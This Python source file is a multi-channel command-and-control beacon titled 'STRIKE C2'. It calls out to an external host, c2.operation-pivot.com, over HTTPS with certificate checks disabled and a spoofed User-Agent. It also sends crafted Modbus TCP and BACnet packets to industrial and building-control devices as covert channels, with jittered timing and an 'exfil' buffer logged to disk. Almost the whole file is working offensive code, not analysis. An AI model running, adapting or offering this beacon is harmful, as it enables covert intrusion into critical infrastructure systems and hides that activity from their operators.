#!/usr/bin/env python3
"""STRIKE C2 Multi-Channel Beacon — Modbus/BACnet/DNP3/HTTPS covert channels"""
import socket, ssl, struct, time, json, os, sys, threading, random
from datetime import datetime, timezone

C2_DIR = os.path.dirname(os.path.abspath(__file__))
OPS_DIR = os.path.dirname(C2_DIR)
C2_LOG = os.path.join(OPS_DIR, "logs", "c2_beacon_log.jsonl")

C2_CONFIG = {
    "callback_host": "c2.operation-pivot.com",
    "beacon_interval": 15,
    "jitter_percent": 50,
    "protocols": {
        "modbus": {"port": 502, "covert_field": "holding_register_0xFF00"},
        "bacnet": {"port": 47808, "covert_field": "analog_value_present_value"},
        "dnp3":   {"port": 20000, "covert_field": "unsolicited_response_data"},
        "https":  {"port": 443,  "covert_field": "checkin_query_param"}
    }
}

class MultichannelBeacon:
    def __init__(self, config=C2_CONFIG):
        self.config = config
        self.exfil_buffer = []
        self.task_queue = []
        self.lock = threading.Lock()
    
    def beacon_modbus(self, target):
        """Covert C2 via Modbus TCP register reads"""
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((target, 502))
                tid = int(time.time()) & 0xFFFF
                frame = struct.pack(">HHHBBHH", tid, 0, 6, 1, 0x03, 0xFF00, 1)
                s.send(frame)
                resp = s.recv(1024)
                if len(resp) > 9:
                    with self.lock:
                        self.exfil_buffer.append({"channel": "modbus", "target": target, 
                                                   "data": resp[9:].hex(), "ts": time.time()})
                s.close()
            except:
                pass
            jitter = random.uniform(0.5, 1.5) * self.config["beacon_interval"]
            time.sleep(jitter)
    
    def beacon_bacnet(self, target):
        """Covert C2 via BACnet WriteProperty"""
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(3)
                bvlc = struct.pack(">BBH", 0x81, 0x0A, 0x001C)
                npdu = bytes([0x01, 0x20, 0xFF, 0xFF, 0x00])
                apdu = bytes([0x00, 0x01, 0x0F])
                ts = int(time.time())
                payload = (bytes([0x09, 0x02, 0x00, 0x19, 0x00, 0x00, 0x01, 0x09, 0x55, 0x44]) 
                          + struct.pack(">f", float(ts)))
                s.sendto(bvlc + npdu + apdu + payload, (target, 47808))
                s.close()
                with self.lock:
                    self.exfil_buffer.append({"channel": "bacnet", "target": target, "ts": time.time()})
            except:
                pass
            jitter = random.uniform(0.5, 1.5) * self.config["beacon_interval"]
            time.sleep(jitter)
    
    def beacon_https(self, callback=None):
        """HTTPS C2 with randomized User-Agent"""
        import urllib.request
        cb = callback or f"https://{self.config['callback_host']}"
        ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0.0.0",
            "Mozilla/5.0 (X11; Linux x86_64) Firefox/135.0",
            "curl/7.88.1",
        ]
        while True:
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                req = urllib.request.Request(
                    f"{cb}/status?checkin={int(time.time())}&data={random.randint(1000,9999)}",
                    headers={"User-Agent": random.choice(ua_list)}
                )
                resp = urllib.request.urlopen(req, context=ctx, timeout=10)
                with self.lock:
                    self.exfil_buffer.append({"channel": "https", "callback": cb, "ts": time.time()})
            except:
                pass
            jitter = random.uniform(0.5, 1.5) * 300
            time.sleep(jitter)
    
    def flush_exfil(self):
        """Write exfil buffer to log"""
        with self.lock:
            for entry in self.exfil_buffer:
                entry["logged_at"] = datetime.now(timezone.utc).isoformat()
                with open(C2_LOG, "a") as f:
                    f.write(json.dumps(entry) + "\n")
            self.exfil_buffer = []

if __name__ == "__main__":
    print(f"[C2] Vigil Multi-Channel Beacon — {datetime.now(timezone.utc).isoformat()}")
    print(f"    Channels: {list(C2_CONFIG['protocols'].keys())}")
    print(f"    Interval: {C2_CONFIG['beacon_interval']}s ±{C2_CONFIG['jitter_percent']}%")
    print(f"    Callback: {C2_CONFIG['callback_host']}")
